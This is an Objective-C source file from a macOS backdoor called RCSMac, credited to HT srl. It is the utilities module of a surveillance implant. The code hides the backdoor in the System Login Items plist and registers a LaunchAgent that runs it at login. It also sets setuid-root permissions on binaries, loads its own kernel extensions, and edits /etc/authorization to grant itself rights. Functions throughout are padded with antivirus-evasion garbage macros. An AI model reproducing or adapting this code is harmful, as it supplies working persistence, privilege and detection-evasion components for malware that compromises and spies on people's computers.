/*
 * RCSMac - RCSMUtils
 *
 * Created by Alfredo 'revenge' Pesoli on 27/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <sys/stat.h>

#import "RCSMUtils.h"
#import "RCSMCommon.h"

#import "RCSMDebug.h"
#import "RCSMLogger.h"

#import "RCSMAVGarbage.h"

static __m_MUtils *sharedUtils = nil;

@implementation __m_MUtils

@synthesize mBackdoorPath;
@synthesize mKext32Path;
@synthesize mKext64Path;
@synthesize mSLIPlistPath;
@synthesize mServiceLoaderPath;
@synthesize mExecFlag;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MUtils *)sharedInstance
{
@synchronized(self)
  {
    if (sharedUtils == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedUtils;
}

+ (id)allocWithZone: (NSZone *)aZone
{
@synchronized(self)
  {
    if (sharedUtils == nil)
      {
        sharedUtils = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedUtils;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
@synchronized(myClass)
  {
    if (sharedUtils != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            sharedUtils = self;
          }
      }
  }
  
  return sharedUtils;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark General purpose routines
#pragma mark -


- (BOOL)searchSLIPlistForKey: (NSString *)aKey;
{  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSMutableDictionary *dicts = [self openSLIPlist];
  NSArray *keys = [dicts allKeys];
  
  if (dicts)
  {
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    for (NSString *key in keys)
    {
      if ([key isEqualToString: @"AutoLaunchedApplicationDictionary"])
      {
        NSString *value = (NSString *)[dicts valueForKey: key];
        id searchResult = [value valueForKey: @"Path"];
        
        NSEnumerator *enumerator = [searchResult objectEnumerator];
        id searchResObject;
        
        while ((searchResObject = [enumerator nextObject]) != nil )
        {
          if ([searchResObject isEqualToString: aKey])
            return YES;
        }
      }
    }
  }
  
  return NO;
}

- (BOOL)saveSLIPlist: (id)anObject atPath: (NSString *)aPath
{  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  BOOL success = [anObject writeToFile: aPath
                            atomically: YES];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (success == NO)
  {
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  //
  // Force owner since we can't remove that file if not owned by us
  // with removeItemAtPath:error (e.g. backdoor upgrade)
  //
  NSString *ourPlist = createLaunchdPlistPath();
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
                             userAndGroup,
                             ourPlist,
                             nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [gUtil executeTask: @"/usr/sbin/chown"
       withArguments: _tempArguments
        waitUntilEnd: YES];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [_tempArguments release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

- (BOOL)addBackdoorToSLIPlist
{   
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSMutableDictionary *dicts = [self openSLIPlist];
  NSArray *keys = [dicts allKeys];

  if (dicts)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_003
    
      for (NSString *key in keys)
        {
          if ([key isEqualToString: @"AutoLaunchedApplicationDictionary"])
            {
              NSMutableArray *value = (NSMutableArray *)[dicts objectForKey: key];
              
              if (value != nil)
                {
#ifdef DEBUG_UTILS
                  NSLog(@"%s - %@", __FUNCTION__, value);
                  NSLog(@"%s - %@", __FUNCTION__, [value class]);
#endif
                  
                  NSMutableDictionary *entry = [NSMutableDictionary new];
                  [entry setObject: [NSNumber numberWithBool: TRUE] forKey: @"Hide"];
                  [entry setObject: [[NSBundle mainBundle] bundlePath] forKey: @"Path"];
                  
                  [value addObject: entry];
                  
                  [entry release];
                }
            }
        }
    }
  
  return [self saveSLIPlist: dicts
                     atPath: @"com.apple.SystemLoginItems.plist"];
}

- (BOOL)removeBackdoorFromSLIPlist
{ 
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  //
  // For now we just move back the backup that we made previously
  // The best way would be just by removing our own entry from the most
  // up to date SLI plist /Library/Preferences/com.apple.SystemLoginItems.plist
  //
  if ([[NSFileManager defaultManager] removeItemAtPath: mSLIPlistPath
                                                 error: nil] == YES)
    {
      if ([[NSFileManager defaultManager] fileExistsAtPath: @"com.apple.SystemLoginItems.plist_bak"])
        {
          return [[NSFileManager defaultManager] copyItemAtPath: @"com.apple.SystemLoginItems.plist_bak"
                                                         toPath: mSLIPlistPath
                                                          error: nil];
        }
      else
        {
          return YES;
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  return NO;
}

- (BOOL)createLaunchAgentPlist: (NSString *)aLabel
                     forBinary: (NSString *)aBinary
{
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
  NSDictionary *innerDict;
  
  // AV evasion: only on release build
  AV_GARBAGE_002

  NSString *launchAgentsFileName = createLaunchdPlistPath();
  
  // AV evasion: only on release build
  AV_GARBAGE_009

//  NSString *launchAgentsPath     = [launchAgentsFileName stringByDeletingLastPathComponent];
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_004
//
//  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
//  {  
//    if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
//    {
//      // AV evasion: only on release build
//      AV_GARBAGE_008
//    
//      return NO;
//    }
//  }
//  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSString *errorLog = [NSString stringWithFormat: @"/dev/null"];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSString *outLog   = [NSString stringWithFormat: @"/dev/null"];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  innerDict = 
    [[NSDictionary alloc] initWithObjectsAndKeys:aLabel, @"Label",
                                                 @"Aqua", @"LimitLoadToSessionType",
                                                 [NSNumber numberWithBool: FALSE], @"OnDemand",
                                                 [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
                                                 errorLog, @"StandardErrorPath",
                                                 outLog, @"StandardOutPath",
                                                 nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [rootObj addEntriesFromDictionary: innerDict];
  [innerDict release];
  
  return [self saveSLIPlist: rootObj
                     atPath: launchAgentsFileName];
}

- (BOOL)createSLIPlistWithBackdoor
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity:1];
  NSDictionary *innerDict;
  NSMutableArray *innerArray = [NSMutableArray new];
  NSString *appKey = @"AutoLaunchedApplicationDictionary";
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSArray *tempArray = [NSArray arrayWithObjects: @"1",
                                                  [[NSBundle mainBundle] bundlePath],
                                                  nil];
  NSArray *tempKeys  = [NSArray arrayWithObjects: @"Hide",
                                                  @"Path",
                                                  nil];
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  innerDict = [NSDictionary dictionaryWithObjects: tempArray
                                          forKeys: tempKeys];
  [innerArray addObject: innerDict];
  [rootObj setObject: innerArray
              forKey: appKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSString *err;
  NSData *binData = [NSPropertyListSerialization dataFromPropertyList: rootObj
                                                               format: NSPropertyListXMLFormat_v1_0
                                                     errorDescription: &err];
  
  [innerArray release];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (binData)
    {
      return [self saveSLIPlist: binData
                         atPath: [self mSLIPlistPath]];
    }
  else
    {
#ifdef DEBUG_UTILS
      NSLog(@"[createSLIPlist] An error occurred");
#endif
      
      [err release];
    }
  
  return NO;
}

- (BOOL)isBackdoorPresentInSLI: (NSString *)aKey
{  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  return [self searchSLIPlistForKey: aKey];
}

- (id)openSLIPlist
{  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSData *binData = [NSData dataWithContentsOfFile: mSLIPlistPath];
  NSString *error;
  
  if (!binData)
    {
#ifdef DEBUG_UTILS
      NSLog(@"[openSLIPlist] Error while opening %@", mSLIPlistPath);
#endif
      
      return 0;
    }
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSPropertyListFormat format;
  NSMutableDictionary *dicts = (NSMutableDictionary *)
                      [NSPropertyListSerialization propertyListFromData: binData
                                                       mutabilityOption: NSPropertyListMutableContainersAndLeaves
                                                                 format: &format
                                                       errorDescription: &error];
  
  if (dicts)
    {
      return dicts;
    }

  return 0;
}

- (BOOL)dropExecFlag
{
  BOOL success;
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  // Create the empty existence flag file
  success = [@"" writeToFile: [self mExecFlag]
                  atomically: NO
                    encoding: NSUnicodeStringEncoding
                       error: nil];
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (success == YES)
  {
#ifdef DEBUG_UTILS
    NSLog(@"Existence flag created successfully"); 
#endif
    
    return YES;
  }
  else
  {
#ifdef DEBUG_UTILS
    NSLog(@"Error while creating the existence flag");
#endif
    
    return NO;
  }
}

- (BOOL)makeSuidBinary: (NSString *)aBinary
{
  BOOL success;
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  //
  // Forcing suid permission on start, just to be sure
  //
  if (gOSMajor == 10 && (gOSMinor == 5 || gOSMinor == 6))
    {
      u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
      NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
      NSValue *owner      = [NSNumber numberWithInt: 0];
      
      NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                      permission,
                                      NSFilePosixPermissions,
                                      owner,
                                      NSFileOwnerAccountID,
                                      nil];
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                                 ofItemAtPath: aBinary
                                                        error: nil];
      
      //[self disableSetugidAuth];
    }
  else
    {
      success = NO;
    }
  
  return success;
}

- (BOOL)unloadKext
{  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (is64bitKernel())
  {
#ifdef DEBUG_UTILS
    NSLog(@"Unloading our KEXT64 @ %@", mKext64Path);
#endif
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: mKext64Path])
    {
#ifdef DEBUG_UTILS
      NSLog(@"KEXT64 found");
#endif
      
      if (getuid() == 0 || geteuid() == 0)
      {  
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        NSArray *arguments = [NSArray arrayWithObjects: mKext64Path, nil];
        
        [self executeTask: @"/sbin/kextunload"
            withArguments: arguments
             waitUntilEnd: YES];
      }
    }
    else
    {
#ifdef DEBUG_UTILS
      NSLog(@"KEXT64 not found");
#endif
      return NO;
    }
  }
  else
  {
#ifdef DEBUG_UTILS
    NSLog(@"Unloading our KEXT32 @ %@", mKext32Path);
#endif
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: mKext32Path])
    {
#ifdef DEBUG_UTILS
      NSLog(@"KEXT32 found");
#endif
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if (getuid() == 0 || geteuid() == 0)
      {
        NSArray *arguments = [NSArray arrayWithObjects: mKext32Path, nil];
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        [self executeTask: @"/sbin/kextunload"
            withArguments: arguments
             waitUntilEnd: YES];
      }
    }
    else
    {
#ifdef DEBUG_UTILS
      NSLog(@"KEXT not found");
#endif
      return NO;
    }
  }
  
  return YES;
}

- (BOOL)loadKextFor64bit: (BOOL)is64bit
{  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (is64bitKernel())
    {
#ifdef DEBUG_UTILS
      NSLog(@"Loading KEXT64 @ %@", mKext64Path);
#endif
      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext64Path])
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT64 found");
#endif
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          NSArray *arguments = [NSArray arrayWithObjects: @"-R",
                                                          @"744",
                                                          mKext64Path,
                                                          nil];
          [self executeTask: @"/bin/chmod"
              withArguments: arguments
               waitUntilEnd: YES];
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          if (getuid() == 0 || geteuid() == 0)
            {
              arguments = [NSArray arrayWithObjects: @"-R",
                                                     @"root:wheel",
                                                     mKext64Path,
                                                     nil];
              [self executeTask: @"/usr/sbin/chown"
                  withArguments: arguments
                   waitUntilEnd: YES];

              // AV evasion: only on release build
              AV_GARBAGE_009
              
              arguments = [NSArray arrayWithObjects: mKext64Path, nil];

              [self executeTask: @"/sbin/kextload"
                  withArguments: arguments
                   waitUntilEnd: YES];
            }
        }
      else
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT64 not found");
#endif

          return NO;
        }
    }
  else
    {
#ifdef DEBUG_UTILS
      //NSLog(@"Loading KEXT32 @ %@", mKextPath);
#endif
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if ([[NSFileManager defaultManager] fileExistsAtPath: mKext32Path])
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT32 found");
#endif
          NSArray *arguments = [NSArray arrayWithObjects: @"-R",
                                                          @"744",
                                                          mKext32Path,
                                                          nil];
          [self executeTask: @"/bin/chmod"
              withArguments: arguments
               waitUntilEnd: YES];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          if (getuid() == 0 || geteuid() == 0)
            {
              arguments = [NSArray arrayWithObjects: @"-R",
                                                     @"root:wheel",
                                                     mKext32Path,
                                                     nil];
              [self executeTask: @"/usr/sbin/chown"
                  withArguments: arguments
                   waitUntilEnd: YES];

              arguments = [NSArray arrayWithObjects: mKext32Path, nil];
              
              // AV evasion: only on release build
              AV_GARBAGE_004
              
              [self executeTask: @"/sbin/kextload"
                  withArguments: arguments
                   waitUntilEnd: YES];
            }
        }
      else
        {
#ifdef DEBUG_UTILS
          NSLog(@"KEXT32 not found");
#endif

          return NO;
        }
    }
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  return YES;
}

- (BOOL)disableSetugidAuth
{  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSData *binData = [NSData dataWithContentsOfFile: @"/etc/authorization"];
  
  if (!binData)
  {
#ifdef DEBUG_UTILS
    errorLog(@"Error while opening auth file");
#endif
    
    return NO;
  }
  
  NSPropertyListFormat format;
  NSMutableDictionary *rootObject = nil;
  
#ifdef MAC_OS_X_VERSION_10_6
  NSError *error;
  rootObject = (NSMutableDictionary *)
  [NSPropertyListSerialization propertyListWithData: binData
                                            options: NSPropertyListMutableContainersAndLeaves
                                             format: &format
                                              error: &error];
#else
  NSString *error;
  rootObject = (NSMutableDictionary *)
  [NSPropertyListSerialization propertyListFromData: binData
                                   mutabilityOption: NSPropertyListMutableContainersAndLeaves
                                             format: &format
                                   errorDescription: &error];
#endif
  
  NSArray *rootKeys = [rootObject allKeys];
  
  if (rootObject)
  {
    for (NSString *key in rootKeys)
    {
      if ([key isEqualToString: @"rights"])
      {
        NSMutableDictionary *dictsArray = (NSMutableDictionary *)[rootObject objectForKey: key];
        
        if (dictsArray != nil)
        {
          NSString *entryKey = @"system.privilege.setugid_appkit";
          [dictsArray removeObjectForKey: entryKey];
        }
      }
    }
  }
  
  return [self saveSLIPlist: rootObject
                     atPath: @"/etc/authorization"];  
}

- (BOOL)enableSetugidAuth
{  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSData *binData = [NSData dataWithContentsOfFile: @"/etc/authorization"];
  
  if (!binData)
    {
#ifdef DEBUG_UTILS
      errorLog(@"Error while opening auth file");
#endif
    
      return NO;
    }
  
  NSPropertyListFormat format;
  NSMutableDictionary *rootObject = nil;
  
  NSError *error;
  rootObject = (NSMutableDictionary *)
    [NSPropertyListSerialization propertyListWithData: binData
                                              options: NSPropertyListMutableContainersAndLeaves
                                               format: &format
                                                error: &error];
  
  NSArray *rootKeys = [rootObject allKeys];
  
  if (rootObject)
    {
      for (NSString *key in rootKeys)
        {
          if ([key isEqualToString: @"rights"])
            {
              NSMutableDictionary *dictsArray = (NSMutableDictionary *)[rootObject objectForKey: key];
              
              if (dictsArray != nil)
                {
                  /*
                   <key>system.privilege.setugid_appkit</key> 
                     <dict> 
                     <key>class</key> 
                     <string>allow</string> 
                     <key>comment</key> 
                     <string>Comment here</string> 
                     </dict>
                  */
                  
                  NSString *entryKey = @"system.privilege.setugid_appkit";
                  id object = [dictsArray objectForKey: entryKey];
                  
                  if (object == nil)
                    {
#ifdef DEBUG_UTILS
                      warnLog(@"setugid_appkit capability not found");
#endif
                      NSArray *keys = [NSArray arrayWithObjects: @"class",
                                                                 @"comment",
                                                                 nil];
                      
                      NSArray *objects = [NSArray arrayWithObjects: @"allow",
                                                                    @"a",
                                                                    nil];
                      
                      NSDictionary *innerDict = [NSDictionary dictionaryWithObjects: objects
                                                                            forKeys: keys];
                      NSDictionary *outerDict = [NSDictionary dictionaryWithObject: innerDict
                                                                            forKey: entryKey];
                      [dictsArray addEntriesFromDictionary: outerDict];
                    }
                  else
                    {
#ifdef DEBUG_UTILS
                      warnLog(@"setugid_appkit capability already found");
#endif
                    }
                }
            }
        }
    }
  else
    {
#ifdef DEBUG_UTILS
      errorLog(@"rootObject not found");
#endif
    }
  
  return [self saveSLIPlist: rootObject
                     atPath: @"/etc/authorization"];
}

- (BOOL)isLion
{  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (gOSMajor == 10 && gOSMinor == 7)
    return YES;
  
  return NO;
}

- (BOOL)isLeopard
{ 
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (gOSMajor == 10 && gOSMinor == 5)
    return YES;
  
  return NO;
}

- (void)executeTask: (NSString *)anAppPath
      withArguments: (NSArray *)arguments
       waitUntilEnd: (BOOL)waitForExecution
{ 
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSTask *task = [[NSTask alloc] init];
  [task setLaunchPath: anAppPath];
  
  if (arguments != nil)
    [task setArguments: arguments];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSPipe *_pipe = [NSPipe pipe];
  [task setStandardOutput: _pipe];
  [task setStandardError:  _pipe];
  
#ifdef DEBUG_UTILS
  infoLog(@"Executing %@", anAppPath);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [task launch];
  
#ifdef DEBUG_UTILS
  infoLog(@"Executed %@", anAppPath);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (waitForExecution == YES)
  {
#ifdef DEBUG_UTILS
    infoLog(@"Waiting until task exit");
#endif
    [task waitUntilExit];
  }
  
#ifdef DEBUG_UTILS
  infoLog(@"Task exited");
#endif
  
  [task release];
}

@end
